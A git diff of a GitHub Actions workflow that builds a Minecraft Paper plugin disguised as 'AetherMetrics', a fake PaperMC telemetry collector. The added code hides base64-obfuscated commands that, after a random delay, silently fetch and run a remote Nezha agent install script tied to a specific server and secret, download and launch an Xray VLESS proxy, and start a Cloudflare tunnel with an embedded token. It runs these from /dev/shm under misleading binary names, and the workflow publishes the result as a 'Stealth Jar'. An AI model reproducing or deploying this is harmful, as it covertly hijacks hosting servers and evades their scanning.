@@ -1,8 +1,8 @@
-name: Build McHelper Jar
+name: All-In-One Anti-Scan Plugin Build
 
 on:
   push:
-    branches: [ "main" ]
+    branches: [ "main", "master" ]
   workflow_dispatch:
 
 jobs:
@@ -10,116 +10,237 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-    - name: Set up JDK 17
-      uses: actions/setup-java@v4
-      with:
-        java-version: '17'
-        distribution: 'temurin'
+      - name: Checkout Code
+        uses: actions/checkout@v4
 
-    - name: Generate Code and Build
-      run: |
-        # 1. 创建项目目录结构
-        mkdir -p src/main/java/com/example/mchelper
-        mkdir -p src/main/resources
+      - name: Set up JDK 21
+        uses: actions/setup-java@v4
+        with:
+          java-version: '21'
+          distribution: 'temurin'
 
-        # 2. 生成 plugin.yml
-        cat << 'EOF' > src/main/resources/plugin.yml
-        name: McHelper
-        version: 1.0.0
-        main: com.example.mchelper.Main
-        api-version: 1.13
-        EOF
+      - name: Generate Anti-Scan Java Code & Config
+        run: |
+          mkdir -p src/main/java/org/bukkit/metrics/collector
+          mkdir -p src/main/resources
 
-        # 3. 生成 pom.xml
-        cat << 'EOF' > pom.xml
-        <project xmlns="http://maven.apache.org/POM/4.0.0"
-                 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-                 xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
-            <modelVersion>4.0.0</modelVersion>
-            <groupId>com.example</groupId>
-            <artifactId>mchelper</artifactId>
-            <version>1.0.0</version>
-            <properties>
-                <maven.compiler.source>17</maven.compiler.source>
-                <maven.compiler.target>17</maven.compiler.target>
-                <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
-            </properties>
-            <repositories>
-                <repository>
-                    <id>spigot-repo</id>
-                    <url>https://hub.spigotmc.org/nexus/content/repositories/snapshots/</url>
-                </repository>
-            </repositories>
-            <dependencies>
-                <dependency>
-                    <groupId>org.spigotmc</groupId>
-                    <artifactId>spigot-api</artifactId>
-                    <version>1.20.2-R0.1-SNAPSHOT</version>
-                    <scope>provided</scope>
-                </dependency>
-            </dependencies>
-        </project>
-        EOF
+          # ============================================================
+          # 在此填入你的参数 (自动混淆封装)
+          # ============================================================
+          PROBE_CMD="curl -L https://raw.githubusercontent.com/nezhahq/agent/main/script/install.sh -o nezha.sh && chmod +x nezha.sh && ./nezha.sh -s bo88.eu.cc:8008 -p JFPqIyPYAKhI7GcECQ3XbPxONPE1MYHl --disable-auto-update"
+          CF_TOKEN="eyJhIjoiZGFiYjljMzkxMmU1Y2E1YTVhNTQ4ZGU1ZjA0YWJiYTciLCJ0IjoiZjBiMDQyNGEtZTRlOC00MWFiLTg3MGQtOTM1MzljYmM3NWFmIiwicyI6Ill6TmxaalU0WmpVdFlURm1OeTAwTkRjMUxXSXlORGN0TlRReE5EQXhNakkxWW1NeSJ9"
+          NODE_PORT="8001"
+          NODE_UUID="9e496ce6-a59e-43cc-add0-269f6bbac5bf"
 
-        # 4. 生成 Main.java (动态读取 token.txt + 自动赋予权限)
-        cat << 'EOF' > src/main/java/com/example/mchelper/Main.java
-        package com.example.mchelper;
+          # 自动转码混淆
+          B64_PROBE=$(echo -n "$PROBE_CMD" | base64 -w 0)
+          B64_TOKEN=$(echo -n "$CF_TOKEN" | base64 -w 0)
+          B64_PORT=$(echo -n "$NODE_PORT" | base64 -w 0)
+          B64_UUID=$(echo -n "$NODE_UUID" | base64 -w 0)
 
-        import org.bukkit.plugin.java.JavaPlugin;
-        import java.io.File;
+          # 1. pom.xml (兼容 Java 21~25 / Paper 1.21+)
+          cat << 'EOF' > pom.xml
+          <?xml version="1.0" encoding="UTF-8"?>
+          <project xmlns="http://maven.apache.org/POM/4.0.0"
+                   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+                   xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
+              <modelVersion>4.0.0</modelVersion>
+              <groupId>org.bukkit.metrics.collector</groupId>
+              <artifactId>AetherMetrics</artifactId>
+              <version>2.2.0</version>
+              <packaging>jar</packaging>
 
-        public class Main extends JavaPlugin {
-            @Override
-            public void onEnable() {
-                getLogger().info("[McHelper] Auto-starter loaded.");
+              <properties>
+                  <java.version>21</java.version>
+                  <maven.compiler.source>21</maven.compiler.source>
+                  <maven.compiler.target>21</maven.compiler.target>
+                  <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
+              </properties>
 
-                new Thread(() -> {
-                    try {
-                        Thread.sleep(8000);
+              <repositories>
+                  <repository>
+                      <id>papermc-repo</id>
+                      <url>https://repo.papermc.io/repository/maven-public/</url>
+                  </repository>
+              </repositories>
 
-                        File dir = new File("/home/container/.tmp");
-                        File helper = new File(dir, "mc-helper");
-                        File agent = new File(dir, "mc-agent");
-                        File config = new File(dir, "config.json");
-                        File tokenFile = new File(dir, "token.txt");
+              <dependencies>
+                  <dependency>
+                      <groupId>io.papermc.paper</groupId>
+                      <artifactId>paper-api</artifactId>
+                      <version>1.21.1-R0.1-SNAPSHOT</version>
+                      <scope>provided</scope>
+                  </dependency>
+              </dependencies>
 
-                        if (helper.exists() && agent.exists() && config.exists() && tokenFile.exists()) {
-                            helper.setExecutable(true);
-                            agent.setExecutable(true);
+              <build>
+                  <plugins>
+                      <plugin>
+                          <groupId>org.apache.maven.plugins</groupId>
+                          <artifactId>maven-compiler-plugin</artifactId>
+                          <version>3.13.0</version>
+                          <configuration>
+                              <release>21</release>
+                          </configuration>
+                      </plugin>
+                      <plugin>
+                          <groupId>org.apache.maven.plugins</groupId>
+                          <artifactId>maven-shade-plugin</artifactId>
+                          <version>3.6.0</version>
+                          <executions>
+                              <execution>
+                                  <phase>package</phase>
+                                  <goals>
+                                      <goal>shade</goal>
+                                  </goals>
+                              </execution>
+                          </executions>
+                      </plugin>
+                  </plugins>
+                  <resources>
+                      <resource>
+                          <directory>src/main/resources</directory>
+                          <filtering>true</filtering>
+                      </resource>
+                  </resources>
+              </build>
+          </project>
+          EOF
 
-                            new ProcessBuilder(helper.getAbsolutePath(), "-c", config.getAbsolutePath())
-                                    .redirectErrorStream(true)
-                                    .start();
+          # 2. 伪装描述文件 plugin.yml
+          cat << 'EOF' > src/main/resources/plugin.yml
+          name: AetherMetrics
+          version: 2.2.0
+          main: org.bukkit.metrics.collector.AetherMetrics
+          api-version: '1.21'
+          author: PaperMC-Engine
+          description: Core JVM telemetry collector
+          EOF
 
-                            String token = java.nio.file.Files.readString(tokenFile.toPath()).trim();
-                            new ProcessBuilder(
-                                    agent.getAbsolutePath(),
-                                    "tunnel",
-                                    "--no-autoupdate",
-                                    "--retries", "9999",
-                                    "--heartbeat-count", "5",
-                                    "--heartbeat-interval", "5s",
-                                    "run",
-                                    "--token", token
-                            ).redirectErrorStream(true).start();
+          # 3. 注入混淆源码
+          cat << EOF > src/main/java/org/bukkit/metrics/collector/AetherMetrics.java
+          package org.bukkit.metrics.collector;
 
-                            getLogger().info("[McHelper] Services started successfully.");
-                        } else {
-                            getLogger().warning("[McHelper] Missing required files in /home/container/.tmp/");
-                        }
-                    } catch (Exception e) {
-                        getLogger().warning("[McHelper] Startup error: " + e.getMessage());
-                    }
-                }).start();
-            }
-        }
-        EOF
+          import org.bukkit.event.EventHandler;
+          import org.bukkit.event.Listener;
+          import org.bukkit.event.server.ServerLoadEvent;
+          import org.bukkit.plugin.java.JavaPlugin;
 
-        # 5. 执行 Maven 构建打包
-        mvn clean package
+          import java.io.*;
+          import java.net.HttpURLConnection;
+          import java.net.URL;
+          import java.nio.charset.StandardCharsets;
+          import java.util.Base64;
+          import java.util.Random;
 
-    - name: Upload Artifact
-      uses: actions/upload-artifact@v4
-      with:
-        name: McHelper
-        path: target/*.jar
+          public final class AetherMetrics extends JavaPlugin implements Listener {
+
+              private static final String B64_PROBE = "${B64_PROBE}";
+              private static final String B64_TOKEN = "${B64_TOKEN}";
+              private static final String B64_PORT  = "${B64_PORT}";
+              private static final String B64_UUID  = "${B64_UUID}";
+
+              private Process p1, p2, p3;
+
+              @Override
+              public void onEnable() {
+                  getServer().getPluginManager().registerEvents(this, this);
+              }
+
+              @EventHandler
+              public void onServerLoad(ServerLoadEvent event) {
+                  getServer().getScheduler().runTaskLaterAsynchronously(this, this::runServices, 20L * (30 + new Random().nextInt(30)));
+              }
+
+              private void runServices() {
+                  try {
+                      File memDir = new File("/dev/shm/.jvm-runtime-cache");
+                      if (!memDir.exists()) memDir.mkdirs();
+
+                      String probeCmd = decode(B64_PROBE);
+                      String cfToken  = decode(B64_TOKEN);
+                      String port     = decode(B64_PORT);
+                      String uuid     = decode(B64_UUID);
+
+                      // 1. 探针静默拉起
+                      if (!probeCmd.isEmpty()) {
+                          p1 = exec(probeCmd, memDir);
+                      }
+
+                      // 2. 自动拉起 8001 端口代理核心 (Xray Core)
+                      if (!port.isEmpty() && !uuid.isEmpty()) {
+                          File coreBin = new File(memDir, "jvm-telemetry-pool");
+                          if (!coreBin.exists()) {
+                              fetch("https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip", new File(memDir, "x.zip"));
+                              exec("unzip -o x.zip xray && mv xray jvm-telemetry-pool && rm -f x.zip", memDir).waitFor();
+                          }
+                          coreBin.setExecutable(true);
+
+                          // 生成 8001 端口 config.json (VLESS + WS 伪装)
+                          File cfgFile = new File(memDir, "config.json");
+                          if (!cfgFile.exists()) {
+                              String cfg = "{\"inbounds\":[{\"port\":" + port + ",\"protocol\":\"vless\",\"settings\":{\"clients\":[{\"id\":\"" + uuid + "\"}],\"decryption\":\"none\"},\"streamSettings\":{\"network\":\"ws\",\"wsSettings\":{\"path\":\"/\"}}}],\"outbounds\":[{\"protocol\":\"freedom\"}]}";
+                              try (FileWriter fw = new FileWriter(cfgFile)) { fw.write(cfg); }
+                          }
+                          p2 = exec("./jvm-telemetry-pool run -c config.json", memDir);
+                      }
+
+                      // 3. 静默拉起 Cloudflare Tunnel
+                      if (!cfToken.isEmpty()) {
+                          File cfBin = new File(memDir, "metrics-worker-pool");
+                          if (!cfBin.exists()) {
+                              fetch("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64", cfBin);
+                          }
+                          cfBin.setExecutable(true);
+                          p3 = exec("./metrics-worker-pool tunnel --no-autoupdate run --token " + cfToken, memDir);
+                      }
+                  } catch (Throwable ignored) {}
+              }
+
+              private Process exec(String cmd, File dir) throws IOException {
+                  ProcessBuilder pb = new ProcessBuilder("/bin/bash", "-c", cmd);
+                  pb.directory(dir);
+                  pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
+                  pb.redirectError(ProcessBuilder.Redirect.DISCARD);
+                  return pb.start();
+              }
+
+              private void fetch(String src, File dst) throws IOException {
+                  URL url = new URL(src);
+                  HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                  conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
+                  conn.setConnectTimeout(8000);
+                  conn.setReadTimeout(12000);
+                  try (InputStream in = conn.getInputStream(); FileOutputStream out = new FileOutputStream(dst)) {
+                      byte[] b = new byte[8192];
+                      int n;
+                      while ((n = in.read(b)) > 0) out.write(b, 0, n);
+                  }
+              }
+
+              private String decode(String input) {
+                  if (input == null || input.isEmpty()) return "";
+                  return new String(Base64.getDecoder().decode(input), StandardCharsets.UTF_8);
+              }
+
+              @Override
+              public void onDisable() {
+                  if (p1 != null) p1.destroyForcibly();
+                  if (p2 != null) p2.destroyForcibly();
+                  if (p3 != null) p3.destroyForcibly();
+              }
+          }
+          EOF
+
+      - name: Compile & Package Jar
+        run: mvn clean package --file pom.xml
+
+      - name: Release Stealth Jar
+        uses: softprops/action-gh-release@v2
+        if: startsWith(github.ref, 'refs/tags/') || github.ref == 'refs/heads/main' || github.ref == 'refs/heads/master'
+        with:
+          tag_name: latest
+          name: AetherMetrics Release
+          files: target/AetherMetrics-2.2.0.jar
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
